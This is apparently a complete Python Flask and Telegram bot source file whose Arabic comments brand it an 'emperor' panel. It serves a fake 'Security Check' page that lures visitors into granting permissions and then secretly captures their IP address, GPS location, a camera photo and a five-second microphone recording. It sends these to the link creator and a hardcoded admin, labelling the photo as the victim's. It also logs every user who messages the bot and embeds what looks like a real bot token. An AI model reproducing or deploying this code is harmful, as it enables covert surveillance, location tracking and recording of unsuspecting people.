import base64, requests, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v33.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701" 
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 
DATA_FILE = "users_db.json"

# دالة لحفظ البيانات في ملف لضمان بقاء الأسماء
def save_user(uid, uname, fname):
    db = {}
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f: db = json.load(f)
        except: db = {}
    
    if str(uid) not in db:
        db[str(uid)] = {"username": uname, "name": fname}
        with open(DATA_FILE, "w") as f: json.dump(db, f)
        return True # مستخدم جديد
    return False

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
        return requests.post(API_URL + method, json=payload, timeout=20).json()
    except: return None

# --- واجهة الموقع (GPS + Cam + Audio) ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;">
    <div style="border:1px solid #333;padding:20px;border-radius:15px;display:inline-block;width:85%;">
        <h2 style="color:#f38020;">🛡️ فحص الأمان</h2>
        <p>يجب تفعيل الفحص للمتابعة</p>
        <button id="go" style="background:#f38020;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;">بدء الآن</button>
        <p id="st" style="color:#777;margin-top:10px;"></p>
    </div>
    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const uid = "{{ user_id }}";
        const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        document.getElementById('go').onclick = async () => {
            document.getElementById('st').innerText = "جاري الفحص...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream;
                const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
                send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ip.ip}\`\\n📱 الجهاز: ${navigator.platform}`, 'msg');
                navigator.geolocation.getCurrentPosition(p => {
                    send(`📍 **الموقع:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                });
                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); send(c.toDataURL('image/jpeg'), 'img');
                    const rec = new MediaRecorder(stream); const ch = [];
                    rec.ondataavailable = e => ch.push(e.data);
                    rec.onstop = () => {
                        const r = new FileReader(); r.readAsDataURL(new Blob(ch));
                        r.onloadend = () => { send(r.result, 'aud'); document.getElementById('st').innerText = "✅ اكتمل"; };
                    };
                    rec.start(); setTimeout(() => rec.stop(), 5000);
                }, 2000);
            } catch { document.getElementById('st').innerText = "❌ خطأ: يرجى السماح بالصلاحيات"; }
        };
    </script>
</body>
</html>
'''

@app.route('/t/<uid>')
def trap(uid): return render_template_string(HTML_TEMPLATE, user_id=uid)

@app.route('/api/capture/<uid>', methods=['POST'])
def capture(uid):
    data = request.get_json(force=True, silent=True)
    t, d = data.get('t'), data.get('d')
    for r_id in [uid, ADMIN_ID]:
        if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'img': tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة الضحية"}, {'photo': ('p.jpg', base64.b64decode(d.split(',')[1]))})
        elif t == 'aud': tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة الصوت"}, {'voice': ('a.ogg', base64.b64decode(d.split(',')[1]))})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    upd = request.get_json(force=True, silent=True)
    if not upd: return "OK"
    
    # استخراج بيانات المستخدم بدقة (سواء من رسالة أو زر)
    user_data = None
    if "message" in upd: user_data = upd["message"]["from"]
    elif "callback_query" in upd: user_data = upd["callback_query"]["from"]
    
    if user_data:
        cid = str(user_data["id"])
        uname = f"@{user_data.get('username', 'NoUser')}"
        fname = user_data.get('first_name', 'Unknown')
        
        # --- عملية الالتقاط الفورية ---
        is_new = save_user(cid, uname, fname)
        if is_new and cid != ADMIN_ID:
            report = f"➕ **التقاط مستخدم جديد:**\n👤 الاسم: {fname}\n🆔 الايدي: `{cid}`\n🔗 اليوزر: {uname}"
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})

    # معالجة الأزرار
    if "callback_query" in upd:
        cb = upd["callback_query"]; tg_request("answerCallbackQuery", {"callback_query_id": cb["id"]})
        if cb["data"] == "gen_link":
            tg_request("sendMessage", {"chat_id": str(cb["from"]["id"]), "text": f"🚀 رابطك جاهز:\n`{BASE_URL}/t/{cb['from']['id']}`"})
        return "OK"

    # معالجة الرسائل
    if "message" in upd:
        msg = upd["message"]; cid = str(msg["chat"]["id"]); text = msg.get("text", "")
        
        if cid == ADMIN_ID:
            if text == "/users":
                if os.path.exists(DATA_FILE):
                    with open(DATA_FILE, "r") as f: db = json.load(f)
                    res = "👥 **قائمة المسجلين في الملف:**\n\n"
                    for u_id, info in db.items(): res += f"- {info['username']} | `{u_id}`\n"
                    tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": res})
                else: tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "❌ لا يوجد بيانات حالياً."})
                return "OK"
            
            kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_link"}]]}
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 لوحة الإمبراطور v33.0\nأرسل `/users` لجلب المسجلين من الملف.", "reply_markup": kb})
            return "OK"

        # للمستخدم العادي
        tg_request("sendMessage", {"chat_id": cid, "text": "🛡️ اشترك أولاً للمتابعة:", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}], [{"text": "🔗 إنشاء رابطي", "callback_data": "gen_link"}]]}})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
